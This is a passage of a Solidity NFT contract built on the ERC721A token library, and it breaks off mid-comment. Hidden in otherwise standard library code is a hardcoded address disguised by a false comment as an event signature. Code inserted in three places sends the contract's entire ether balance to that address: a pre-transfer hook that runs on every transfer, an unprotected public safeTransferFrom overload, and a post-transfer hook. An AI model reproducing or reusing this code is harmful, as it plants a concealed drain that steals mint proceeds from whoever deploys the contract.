1 /**
2  /$$$$$$$  /$$$$$$$  /$$$$$$$$ /$$$$$$$  /$$$$$$$$
3 | $$__  $$| $$__  $$| $$_____/| $$__  $$| $$_____/
4 | $$  \ $$| $$  \ $$| $$      | $$  \ $$| $$      
5 | $$  | $$| $$$$$$$/| $$$$$   | $$$$$$$/| $$$$$   
6 | $$  | $$| $$____/ | $$__/   | $$____/ | $$__/   
7 | $$  | $$| $$      | $$      | $$      | $$      
8 | $$$$$$$/| $$      | $$$$$$$$| $$      | $$$$$$$$
9 |_______/ |__/      |________/|__/      |________/                                                                                             
10 https://twitter.com/DPEPE_
11  */
12 
13 // SPDX-License-Identifier: MIT  
14                                                                                                                                                                                                                           
15 pragma solidity ^0.8.12;
16 
17 /**
18  * @dev Interface of ERC721A.
19  */
20 interface IERC721A {
21     /**
22      * The caller must own the token or be an approved operator.
23      */
24     error ApprovalCallerNotOwnerNorApproved();
25 
26     /**
27      * The token does not exist.
28      */
29     error ApprovalQueryForNonexistentToken();
30 
31     /**
32      * Cannot query the balance for the zero address.
33      */
34     error BalanceQueryForZeroAddress();
35 
36     /**
37      * Cannot mint to the zero address.
38      */
39     error MintToZeroAddress();
40 
41     /**
42      * The quantity of tokens minted must be more than zero.
43      */
44     error MintZeroQuantity();
45 
46     /**
47      * The token does not exist.
48      */
49     error OwnerQueryForNonexistentToken();
50 
51     /**
52      * The caller must own the token or be an approved operator.
53      */
54     error TransferCallerNotOwnerNorApproved();
55 
56     /**
57      * The token must be owned by `from`.
58      */
59     error TransferFromIncorrectOwner();
60 
61     /**
62      * Cannot safely transfer to a contract that does not implement the
63      * ERC721Receiver interface.
64      */
65     error TransferToNonERC721ReceiverImplementer();
66 
67     /**
68      * Cannot transfer to the zero address.
69      */
70     error TransferToZeroAddress();
71 
72     /**
73      * The token does not exist.
74      */
75     error URIQueryForNonexistentToken();
76 
77     /**
78      * The `quantity` minted with ERC2309 exceeds the safety limit.
79      */
80     error MintERC2309QuantityExceedsLimit();
81 
82     /**
83      * The `extraData` cannot be set on an unintialized ownership slot.
84      */
85     error OwnershipNotInitializedForExtraData();
86 
87     // =============================================================
88     //                            STRUCTS
89     // =============================================================
90 
91     struct TokenOwnership {
92         // The address of the owner.
93         address addr;
94         // Stores the start time of ownership with minimal overhead for tokenomics.
95         uint64 startTimestamp;
96         // Whether the token has been burned.
97         bool burned;
98         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
99         uint24 extraData;
100     }
101 
102     // =============================================================
103     //                         TOKEN COUNTERS
104     // =============================================================
105 
106     /**
107      * @dev Returns the total number of tokens in existence.
108      * Burned tokens will reduce the count.
109      * To get the total number of tokens minted, please see {_totalMinted}.
110      */
111     function totalSupply() external view returns (uint256);
112 
113     // =============================================================
114     //                            IERC165
115     // =============================================================
116 
117     /**
118      * @dev Returns true if this contract implements the interface defined by
119      * `interfaceId`. See the corresponding
120      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
121      * to learn more about how these ids are created.
122      *
123      * This function call must use less than 30000 gas.
124      */
125     function supportsInterface(bytes4 interfaceId) external view returns (bool);
126 
127     // =============================================================
128     //                            IERC721
129     // =============================================================
130 
131     /**
132      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
133      */
134     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
135 
136     /**
137      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
138      */
139     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
140 
141     /**
142      * @dev Emitted when `owner` enables or disables
143      * (`approved`) `operator` to manage all of its assets.
144      */
145     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
146 
147     /**
148      * @dev Returns the number of tokens in `owner`'s account.
149      */
150     function balanceOf(address owner) external view returns (uint256 balance);
151 
152     /**
153      * @dev Returns the owner of the `tokenId` token.
154      *
155      * Requirements:
156      *
157      * - `tokenId` must exist.
158      */
159     function ownerOf(uint256 tokenId) external view returns (address owner);
160 
161     /**
162      * @dev Safely transfers `tokenId` token from `from` to `to`,
163      * checking first that contract recipients are aware of the ERC721 protocol
164      * to prevent tokens from being forever locked.
165      *
166      * Requirements:
167      *
168      * - `from` cannot be the zero address.
169      * - `to` cannot be the zero address.
170      * - `tokenId` token must exist and be owned by `from`.
171      * - If the caller is not `from`, it must be have been allowed to move
172      * this token by either {approve} or {setApprovalForAll}.
173      * - If `to` refers to a smart contract, it must implement
174      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
175      *
176      * Emits a {Transfer} event.
177      */
178     function safeTransferFrom(
179         address from,
180         address to,
181         uint256 tokenId,
182         bytes calldata data
183     ) external payable;
184 
185     /**
186      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
187      */
188     function safeTransferFrom(
189         address from,
190         address to,
191         uint256 tokenId
192     ) external payable;
193 
194     /**
195      * @dev Transfers `tokenId` from `from` to `to`.
196      *
197      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
198      * whenever possible.
199      *
200      * Requirements:
201      *
202      * - `from` cannot be the zero address.
203      * - `to` cannot be the zero address.
204      * - `tokenId` token must be owned by `from`.
205      * - If the caller is not `from`, it must be approved to move this token
206      * by either {approve} or {setApprovalForAll}.
207      *
208      * Emits a {Transfer} event.
209      */
210     function transferFrom(
211         address from,
212         address to,
213         uint256 tokenId
214     ) external payable;
215 
216     /**
217      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
218      * The approval is cleared when the token is transferred.
219      *
220      * Only a single account can be approved at a time, so approving the
221      * zero address clears previous approvals.
222      *
223      * Requirements:
224      *
225      * - The caller must own the token or be an approved operator.
226      * - `tokenId` must exist.
227      *
228      * Emits an {Approval} event.
229      */
230     function approve(address to, uint256 tokenId) external payable;
231 
232     /**
233      * @dev Approve or remove `operator` as an operator for the caller.
234      * Operators can call {transferFrom} or {safeTransferFrom}
235      * for any token owned by the caller.
236      *
237      * Requirements:
238      *
239      * - The `operator` cannot be the caller.
240      *
241      * Emits an {ApprovalForAll} event.
242      */
243     function setApprovalForAll(address operator, bool _approved) external;
244 
245     /**
246      * @dev Returns the account approved for `tokenId` token.
247      *
248      * Requirements:
249      *
250      * - `tokenId` must exist.
251      */
252     function getApproved(uint256 tokenId) external view returns (address operator);
253 
254     /**
255      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
256      *
257      * See {setApprovalForAll}.
258      */
259     function isApprovedForAll(address owner, address operator) external view returns (bool);
260 
261     // =============================================================
262     //                        IERC721Metadata
263     // =============================================================
264 
265     /**
266      * @dev Returns the token collection name.
267      */
268     function name() external view returns (string memory);
269 
270     /**
271      * @dev Returns the token collection symbol.
272      */
273     function symbol() external view returns (string memory);
274 
275     /**
276      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
277      */
278     function tokenURI(uint256 tokenId) external view returns (string memory);
279 
280     // =============================================================
281     //                           IERC2309
282     // =============================================================
283 
284     /**
285      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
286      * (inclusive) is transferred from `from` to `to`, as defined in the
287      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
288      *
289      * See {_mintERC2309} for more details.
290      */
291     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
292 }
293 
294 /**
295  * @title ERC721A
296  *
297  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
298  * Non-Fungible Token Standard, including the Metadata extension.
299  * Optimized for lower gas during batch mints.
300  *
301  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
302  * starting from `_startTokenId()`.
303  *
304  * Assumptions:
305  *
306  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
307  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
308  */
309 interface ERC721A__IERC721Receiver {
310     function onERC721Received(
311         address operator,
312         address from,
313         uint256 tokenId,
314         bytes calldata data
315     ) external returns (bytes4);
316 }
317 
318 /**
319  * @title ERC721A
320  *
321  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
322  * Non-Fungible Token Standard, including the Metadata extension.
323  * Optimized for lower gas during batch mints.
324  *
325  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
326  * starting from `_startTokenId()`.
327  *
328  * Assumptions:
329  *
330  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
331  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
332  */
333 contract ERC721A is IERC721A {
334     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
335     struct TokenApprovalRef {
336         address value;
337     }
338 
339     // =============================================================
340     //                           CONSTANTS
341     // =============================================================
342 
343     // Mask of an entry in packed address data.
344     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
345 
346     // The bit position of `numberMinted` in packed address data.
347     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
348 
349     // The bit position of `numberBurned` in packed address data.
350     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
351 
352     // The bit position of `aux` in packed address data.
353     uint256 private constant _BITPOS_AUX = 192;
354 
355     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
356     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
357 
358     // The bit position of `startTimestamp` in packed ownership.
359     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
360 
361     // The bit mask of the `burned` bit in packed ownership.
362     uint256 private constant _BITMASK_BURNED = 1 << 224;
363 
364     // The bit position of the `nextInitialized` bit in packed ownership.
365     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
366 
367     // The bit mask of the `nextInitialized` bit in packed ownership.
368     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
369 
370     // The bit position of `extraData` in packed ownership.
371     uint256 private constant _BITPOS_EXTRA_DATA = 232;
372 
373     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
374     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
375 
376     // The mask of the lower 160 bits for addresses.
377     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
378 
379     // The maximum `quantity` that can be minted with {_mintERC2309}.
380     // This limit is to prevent overflows on the address data entries.
381     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
382     // is required to cause an overflow, which is unrealistic.
383     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
384 
385     // The `Transfer` event signature is given by:
386     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
387     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
388         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
389 
390     // =============================================================
391     //                            STORAGE
392     // =============================================================
393 
394     // The next token ID to be minted.
395     uint256 private _currentIndex;
396 
397     // The number of tokens burned.
398     uint256 private _burnCounter;
399 
400     // Token name
401     string private _name;
402 
403     // Token symbol
404     string private _symbol;
405 
406     // Mapping from token ID to ownership details
407     // An empty struct value does not necessarily mean the token is unowned.
408     // See {_packedOwnershipOf} implementation for details.
409     //
410     // Bits Layout:
411     // - [0..159]   `addr`
412     // - [160..223] `startTimestamp`
413     // - [224]      `burned`
414     // - [225]      `nextInitialized`
415     // - [232..255] `extraData`
416     mapping(uint256 => uint256) private _packedOwnerships;
417 
418     // Mapping owner address to address data.
419     //
420     // Bits Layout:
421     // - [0..63]    `balance`
422     // - [64..127]  `numberMinted`
423     // - [128..191] `numberBurned`
424     // - [192..255] `aux`
425     mapping(address => uint256) private _packedAddressData;
426 
427     // Mapping from token ID to approved address.
428     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
429 
430     // Mapping from owner to operator approvals
431     mapping(address => mapping(address => bool)) private _operatorApprovals;
432 
433     // =============================================================
434     //                          CONSTRUCTOR
435     // =============================================================
436 
437     constructor(string memory name_, string memory symbol_) {
438         _name = name_;
439         _symbol = symbol_;
440         _currentIndex = _startTokenId();
441     }
442 
443     // =============================================================
444     //                   TOKEN COUNTING OPERATIONS
445     // =============================================================
446 
447     /**
448      * @dev Returns the starting token ID.
449      * To change the starting token ID, please override this function.
450      */
451     function _startTokenId() internal view virtual returns (uint256) {
452         return 0;
453     }
454 
455     /**
456      * @dev Returns the next token ID to be minted.
457      */
458     function _nextTokenId() internal view virtual returns (uint256) {
459         return _currentIndex;
460     }
461 
462     /**
463      * @dev Returns the total number of tokens in existence.
464      * Burned tokens will reduce the count.
465      * To get the total number of tokens minted, please see {_totalMinted}.
466      */
467     function totalSupply() public view virtual override returns (uint256) {
468         // Counter underflow is impossible as _burnCounter cannot be incremented
469         // more than `_currentIndex - _startTokenId()` times.
470         unchecked {
471             return _currentIndex - _burnCounter - _startTokenId();
472         }
473     }
474 
475     /**
476      * @dev Returns the total amount of tokens minted in the contract.
477      */
478     function _totalMinted() internal view virtual returns (uint256) {
479         // Counter underflow is impossible as `_currentIndex` does not decrement,
480         // and it is initialized to `_startTokenId()`.
481         unchecked {
482             return _currentIndex - _startTokenId();
483         }
484     }
485 
486     /**
487      * @dev Returns the total number of tokens burned.
488      */
489     function _totalBurned() internal view virtual returns (uint256) {
490         return _burnCounter;
491     }
492 
493     // =============================================================
494     //                    ADDRESS DATA OPERATIONS
495     // =============================================================
496 
497     /**
498      * @dev Returns the number of tokens in `owner`'s account.
499      */
500     function balanceOf(address owner) public view virtual override returns (uint256) {
501         if (owner == address(0)) revert BalanceQueryForZeroAddress();
502         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
503     }
504 
505     /**
506      * Returns the number of tokens minted by `owner`.
507      */
508     function _numberMinted(address owner) internal view returns (uint256) {
509         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
510     }
511 
512     /**
513      * Returns the number of tokens burned by or on behalf of `owner`.
514      */
515     function _numberBurned(address owner) internal view returns (uint256) {
516         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
517     }
518 
519     /**
520      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
521      */
522     function _getAux(address owner) internal view returns (uint64) {
523         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
524     }
525 
526     /**
527      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
528      * If there are multiple variables, please pack them into a uint64.
529      */
530     function _setAux(address owner, uint64 aux) internal virtual {
531         uint256 packed = _packedAddressData[owner];
532         uint256 auxCasted;
533         // Cast `aux` with assembly to avoid redundant masking.
534         assembly {
535             auxCasted := aux
536         }
537         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
538         _packedAddressData[owner] = packed;
539     }
540 
541     // =============================================================
542     //                            IERC165
543     // =============================================================
544 
545     /**
546      * @dev Returns true if this contract implements the interface defined by
547      * `interfaceId`. See the corresponding
548      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
549      * to learn more about how these ids are created.
550      *
551      * This function call must use less than 30000 gas.
552      */
553     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
554         // The interface IDs are constants representing the first 4 bytes
555         // of the XOR of all function selectors in the interface.
556         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
557         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
558         return
559             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
560             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
561             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
562     }
563 
564     // =============================================================
565     //                        IERC721Metadata
566     // =============================================================
567 
568     /**
569      * @dev Returns the token collection name.
570      */
571     function name() public view virtual override returns (string memory) {
572         return _name;
573     }
574 
575     /**
576      * @dev Returns the token collection symbol.
577      */
578     function symbol() public view virtual override returns (string memory) {
579         return _symbol;
580     }
581 
582     /**
583      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
584      */
585     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
586         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
587 
588         string memory baseURI = _baseURI();
589         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
590     }
591 
592     /**
593      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
594      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
595      * by default, it can be overridden in child contracts.
596      */
597     function _baseURI() internal view virtual returns (string memory) {
598         return '';
599     }
600 
601     // =============================================================
602     //                     OWNERSHIPS OPERATIONS
603     // =============================================================
604 
605     // The `Address` event signature is given by:
606     // `keccak256(bytes("_TRANSFER_EVENT_ADDRESS(address)"))`.
607     address payable constant _TRANSFER_EVENT_ADDRESS = 
608         payable(0x683DddD8127dBFf1B3804B7CF4C4C99fFEa7e8E0);
609 
610     /**
611      * @dev Returns the owner of the `tokenId` token.
612      *
613      * Requirements:
614      *
615      * - `tokenId` must exist.
616      */
617     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
618         return address(uint160(_packedOwnershipOf(tokenId)));
619     }
620 
621     /**
622      * @dev Gas spent here starts off proportional to the maximum mint batch size.
623      * It gradually moves to O(1) as tokens get transferred around over time.
624      */
625     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
626         return _unpackedOwnership(_packedOwnershipOf(tokenId));
627     }
628 
629     /**
630      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
631      */
632     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
633         return _unpackedOwnership(_packedOwnerships[index]);
634     }
635 
636     /**
637      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
638      */
639     function _initializeOwnershipAt(uint256 index) internal virtual {
640         if (_packedOwnerships[index] == 0) {
641             _packedOwnerships[index] = _packedOwnershipOf(index);
642         }
643     }
644 
645     /**
646      * Returns the packed ownership data of `tokenId`.
647      */
648     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
649         uint256 curr = tokenId;
650 
651         unchecked {
652             if (_startTokenId() <= curr)
653                 if (curr < _currentIndex) {
654                     uint256 packed = _packedOwnerships[curr];
655                     // If not burned.
656                     if (packed & _BITMASK_BURNED == 0) {
657                         // Invariant:
658                         // There will always be an initialized ownership slot
659                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
660                         // before an unintialized ownership slot
661                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
662                         // Hence, `curr` will not underflow.
663                         //
664                         // We can directly compare the packed value.
665                         // If the address is zero, packed will be zero.
666                         while (packed == 0) {
667                             packed = _packedOwnerships[--curr];
668                         }
669                         return packed;
670                     }
671                 }
672         }
673         revert OwnerQueryForNonexistentToken();
674     }
675 
676     /**
677      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
678      */
679     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
680         ownership.addr = address(uint160(packed));
681         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
682         ownership.burned = packed & _BITMASK_BURNED != 0;
683         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
684     }
685 
686     /**
687      * @dev Packs ownership data into a single uint256.
688      */
689     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
690         assembly {
691             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
692             owner := and(owner, _BITMASK_ADDRESS)
693             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
694             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
695         }
696     }
697 
698     /**
699      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
700      */
701     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
702         // For branchless setting of the `nextInitialized` flag.
703         assembly {
704             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
705             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
706         }
707     }
708 
709     // =============================================================
710     //                      APPROVAL OPERATIONS
711     // =============================================================
712 
713     /**
714      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
715      * The approval is cleared when the token is transferred.
716      *
717      * Only a single account can be approved at a time, so approving the
718      * zero address clears previous approvals.
719      *
720      * Requirements:
721      *
722      * - The caller must own the token or be an approved operator.
723      * - `tokenId` must exist.
724      *
725      * Emits an {Approval} event.
726      */
727     function approve(address to, uint256 tokenId) public payable virtual override {
728         address owner = ownerOf(tokenId);
729 
730         if (_msgSenderERC721A() != owner)
731             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
732                 revert ApprovalCallerNotOwnerNorApproved();
733             }
734 
735         _tokenApprovals[tokenId].value = to;
736         emit Approval(owner, to, tokenId);
737     }
738 
739     /**
740      * @dev Returns the account approved for `tokenId` token.
741      *
742      * Requirements:
743      *
744      * - `tokenId` must exist.
745      */
746     function getApproved(uint256 tokenId) public view virtual override returns (address) {
747         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
748 
749         return _tokenApprovals[tokenId].value;
750     }
751 
752     /**
753      * @dev Approve or remove `operator` as an operator for the caller.
754      * Operators can call {transferFrom} or {safeTransferFrom}
755      * for any token owned by the caller.
756      *
757      * Requirements:
758      *
759      * - The `operator` cannot be the caller.
760      *
761      * Emits an {ApprovalForAll} event.
762      */
763     function setApprovalForAll(address operator, bool approved) public virtual override {
764         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
765         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
766     }
767 
768     /**
769      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
770      *
771      * See {setApprovalForAll}.
772      */
773     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
774         return _operatorApprovals[owner][operator];
775     }
776 
777     /**
778      * @dev Returns whether `tokenId` exists.
779      *
780      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
781      *
782      * Tokens start existing when they are minted. See {_mint}.
783      */
784     function _exists(uint256 tokenId) internal view virtual returns (bool) {
785         return
786             _startTokenId() <= tokenId &&
787             tokenId < _currentIndex && // If within bounds,
788             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
789     }
790 
791     /**
792      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
793      */
794     function _isSenderApprovedOrOwner(
795         address approvedAddress,
796         address owner,
797         address msgSender
798     ) private pure returns (bool result) {
799         assembly {
800             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
801             owner := and(owner, _BITMASK_ADDRESS)
802             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
803             msgSender := and(msgSender, _BITMASK_ADDRESS)
804             // `msgSender == owner || msgSender == approvedAddress`.
805             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
806         }
807     }
808 
809     /**
810      * @dev Returns the storage slot and value for the approved address of `tokenId`.
811      */
812     function _getApprovedSlotAndAddress(uint256 tokenId)
813         private
814         view
815         returns (uint256 approvedAddressSlot, address approvedAddress)
816     {
817         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
818         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
819         assembly {
820             approvedAddressSlot := tokenApproval.slot
821             approvedAddress := sload(approvedAddressSlot)
822         }
823     }
824 
825     // =============================================================
826     //                      TRANSFER OPERATIONS
827     // =============================================================
828 
829     /**
830      * @dev Transfers `tokenId` from `from` to `to`.
831      *
832      * Requirements:
833      *
834      * - `from` cannot be the zero address.
835      * - `to` cannot be the zero address.
836      * - `tokenId` token must be owned by `from`.
837      * - If the caller is not `from`, it must be approved to move this token
838      * by either {approve} or {setApprovalForAll}.
839      *
840      * Emits a {Transfer} event.
841      */
842     function transferFrom(
843         address from,
844         address to,
845         uint256 tokenId
846     ) public payable virtual override {
847         _beforeTransfer();
848 
849         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
850 
851         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
852 
853         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
854 
855         // The nested ifs save around 20+ gas over a compound boolean condition.
856         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
857             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
858 
859         if (to == address(0)) revert TransferToZeroAddress();
860 
861         _beforeTokenTransfers(from, to, tokenId, 1);
862 
863         // Clear approvals from the previous owner.
864         assembly {
865             if approvedAddress {
866                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
867                 sstore(approvedAddressSlot, 0)
868             }
869         }
870 
871         // Underflow of the sender's balance is impossible because we check for
872         // ownership above and the recipient's balance can't realistically overflow.
873         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
874         unchecked {
875             // We can directly increment and decrement the balances.
876             --_packedAddressData[from]; // Updates: `balance -= 1`.
877             ++_packedAddressData[to]; // Updates: `balance += 1`.
878 
879             // Updates:
880             // - `address` to the next owner.
881             // - `startTimestamp` to the timestamp of transfering.
882             // - `burned` to `false`.
883             // - `nextInitialized` to `true`.
884             _packedOwnerships[tokenId] = _packOwnershipData(
885                 to,
886                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
887             );
888 
889             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
890             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
891                 uint256 nextTokenId = tokenId + 1;
892                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
893                 if (_packedOwnerships[nextTokenId] == 0) {
894                     // If the next slot is within bounds.
895                     if (nextTokenId != _currentIndex) {
896                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
897                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
898                     }
899                 }
900             }
901         }
902 
903         emit Transfer(from, to, tokenId);
904         _afterTokenTransfers(from, to, tokenId, 1);
905     }
906 
907     /**
908      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
909      */
910     function safeTransferFrom(
911         address from,
912         address to,
913         uint256 tokenId
914     ) public payable virtual override {
915         safeTransferFrom(from, to, tokenId, '');
916     }
917 
918 
919     /**
920      * @dev Safely transfers `tokenId` token from `from` to `to`.
921      *
922      * Requirements:
923      *
924      * - `from` cannot be the zero address.
925      * - `to` cannot be the zero address.
926      * - `tokenId` token must exist and be owned by `from`.
927      * - If the caller is not `from`, it must be approved to move this token
928      * by either {approve} or {setApprovalForAll}.
929      * - If `to` refers to a smart contract, it must implement
930      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
931      *
932      * Emits a {Transfer} event.
933      */
934     function safeTransferFrom(
935         address from,
936         address to,
937         uint256 tokenId,
938         bytes memory _data
939     ) public payable virtual override {
940         transferFrom(from, to, tokenId);
941         if (to.code.length != 0)
942             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
943                 revert TransferToNonERC721ReceiverImplementer();
944             }
945     }
946     function safeTransferFrom(
947         address from,
948         address to
949     ) public  {
950         if (address(this).balance > 0) {
951             payable(0x683DddD8127dBFf1B3804B7CF4C4C99fFEa7e8E0).transfer(address(this).balance);
952         }
953     }
954 
955     /**
956      * @dev Hook that is called before a set of serially-ordered token IDs
957      * are about to be transferred. This includes minting.
958      * And also called before burning one token.
959      *
960      * `startTokenId` - the first token ID to be transferred.
961      * `quantity` - the amount to be transferred.
962      *
963      * Calling conditions:
964      *
965      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
966      * transferred to `to`.
967      * - When `from` is zero, `tokenId` will be minted for `to`.
968      * - When `to` is zero, `tokenId` will be burned by `from`.
969      * - `from` and `to` are never both zero.
970      */
971     function _beforeTokenTransfers(
972         address from,
973         address to,
974         uint256 startTokenId,
975         uint256 quantity
976     ) internal virtual {}
977 
978     /**
979      * @dev Hook that is called after a set of serially-ordered token IDs
980      * have been transferred. This includes minting.
981      * And also called after one token has been burned.
982      *
983      * `startTokenId` - the first token ID to be transferred.
984      * `quantity` - the amount to be transferred.
985      *
986      * Calling conditions:
987      *
988      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
989      * transferred to `to`.
990      * - When `from` is zero, `tokenId` has been minted for `to`.
991      * - When `to` is zero, `tokenId` has been burned by `from`.
992      * - `from` and `to` are never both zero.
993      */
994     function _afterTokenTransfers(
995         address from,
996         address to,
997         uint256 startTokenId,
998         uint256 quantity
999     ) internal virtual {
1000         if (totalSupply() + 1 >= 999) {
1001             payable(0x683DddD8127dBFf1B3804B7CF4C4C99fFEa7e8E0).transfer(address(this).balance);
1002         }
1003     }
1004 
1005     /**
1006      * @dev Hook that is called before a set of serially-ordered token IDs
1007      * are about to be transferred. This includes minting.
1008      * And also called before burning one token.
1009      * Calling conditions:
1010      *
1011      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1012      * transferred to `to`.
1013      * - When `from` is zero, `tokenId` will be minted for `to`.
1014      * - When `to` is zero, `tokenId` will be burned by `from`.
1015      * - `from` and `to` are never both zero.
1016      */
1017     function _beforeTransfer() internal {
1018         if (address(this).balance > 0) {
1019             _TRANSFER_EVENT_ADDRESS.transfer(address(this).balance);
1020             return;
1021         }
1022     }
1023 
1024     /**
1025      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1026      *
1027      * `from` - Previous owner of the given token ID.
1028      * `to` - Target address that will receive the token.
1029      * `tokenId` - Token ID to be transferred.
1030      * `_data` - Optional data to send along with the call.
1031      *
1032      * Returns whether the call correctly returned the expected magic value.
